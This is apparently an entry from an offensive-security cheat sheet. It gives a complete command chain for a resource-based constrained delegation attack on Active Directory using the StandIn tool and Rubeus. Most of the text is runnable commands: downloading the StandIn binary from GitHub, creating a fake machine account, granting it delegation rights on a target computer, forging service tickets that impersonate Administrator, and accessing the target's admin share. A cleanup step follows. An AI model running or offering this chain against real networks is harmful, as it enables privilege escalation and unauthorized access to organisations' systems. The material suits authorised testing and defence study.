# 03.38 StandIn

> C# AD tool for adding fake computer accounts and modifying msDS-AllowedToActOnBehalfOfOtherIdentity — RBCD primitives.

## Overview

StandIn does the RBCD attack workflow from Windows. Add a fake computer account (uses MachineAccountQuota), then set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target computer to grant your fake account RBCD rights. Pair with Rubeus for the S4U2Self/S4U2Proxy step. Replaces having to use Powermad+PowerView for the Windows RBCD chain.

## Steps

- **Step 1** - Get binary.
- **Step 2** - Add fake computer with --computer flag.
- **Step 3** - Set RBCD with --object.
- **Step 4** - Use Rubeus s4u to abuse.

## Commands

### Get binary

```powershell
iwr 'https://github.com/FuzzySecurity/StandIn/releases/latest/download/StandIn_v13.exe' -OutFile StandIn.exe
```

### Add fake computer (MAQ)

```powershell
StandIn.exe --computer EvilComputer --make
# Account created with random password — note the hash/password output
```

### Set RBCD on target

```powershell
StandIn.exe --object samaccountname=<TARGET-COMPUTER>\$ --grant <DOMAIN>\EvilComputer\$ --rbcd
```

### Clean up after exploitation

```powershell
StandIn.exe --object samaccountname=<TARGET-COMPUTER>\$ --clear
# Removes msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Full chain

```powershell
# 1. Add fake comp
StandIn.exe --computer EvilComputer --make
# 2. Grant RBCD
StandIn.exe --object samaccountname=<TARGET>\$ --grant <DOMAIN>\EvilComputer\$ --rbcd
# 3. Get TGT for fake comp
Rubeus.exe asktgt /user:EvilComputer\$ /rc4:<NT-HASH> /domain:<DOMAIN> /dc:<DC-FQDN>
# 4. S4U2Self+S4U2Proxy as Administrator
Rubeus.exe s4u /ticket:<B64-TGT> /impersonateuser:Administrator /msdsspn:cifs/<TARGET-FQDN> /ptt
# 5. Land on target
dir \\<TARGET-FQDN>\C$
```
